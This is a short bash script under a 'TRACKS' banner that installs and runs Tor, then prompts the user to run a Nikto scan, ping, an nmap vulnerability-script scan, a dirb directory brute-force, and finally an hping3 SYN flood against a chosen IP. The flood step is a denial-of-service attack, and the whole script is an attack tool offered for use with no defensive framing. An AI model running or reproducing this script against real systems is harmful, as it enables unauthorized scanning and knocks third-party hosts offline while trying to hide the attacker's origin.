#!/bin/bash

sudo apt install tor
echo "connecting to tor..."
echo "PRESS CRTL + C TO EXIT"
sleep 5
tor
clear

echo "
████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝
   ██║   ██████╔╝███████║██║     █████╔╝ ███████╗
   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ╚════██║
   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████║
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ "
echo "Would you like to Nikto a website (Y/N): "
read choice
if [[ $choice == y* ]]; then
	read website
	nikto -host $website
	clear
else
	echo 'goodbye'
	clear
fi

echo "
████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝
   ██║   ██████╔╝███████║██║     █████╔╝ ███████╗
   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ╚════██║
   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████║
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ "

echo "Would you like to ping an ip (Y/N): "
read choice
if [[ $choice == y* ]]; then
	echo "Enter IP"
	read ip
sleep 3
	clear
	ping -c 5 $ip
	clear
else 
	echo 'goodbye'
	clear
fi 

echo "
████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝
   ██║   ██████╔╝███████║██║     █████╔╝ ███████╗
   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ╚════██║
   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████║
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ "

echo "Would you like to nmap the IP (Y/N): "
read choice
if [[ $choice == y* ]]; then
	 sudo nmap -sV -sS $ip --script vuln > nmap.txt
else 
	echo 'goodbye'
	clear
fi

echo "
████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝
   ██║   ██████╔╝███████║██║     █████╔╝ ███████╗
   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ╚════██║
   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████║
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ "

echo "Would you like to do a dirb (Y/N): "
read choice
if [[ $choice == y* ]]; then
	dirb $website > dirb.txt
else 
	echo 'goodbye'
	clear
fi

echo "
████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝
   ██║   ██████╔╝███████║██║     █████╔╝ ███████╗
   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ╚════██║
   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████║
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ "
echo "Would you like to ping3 (Y/N): "
read choice
if [[ $choice == y* ]]; then
	hping3 --flood -S -d 1960 $ip
else 
	echo 'goodbye'
	clear
fi

echo "exiting tor..."
sleep 5
sudo service tor stop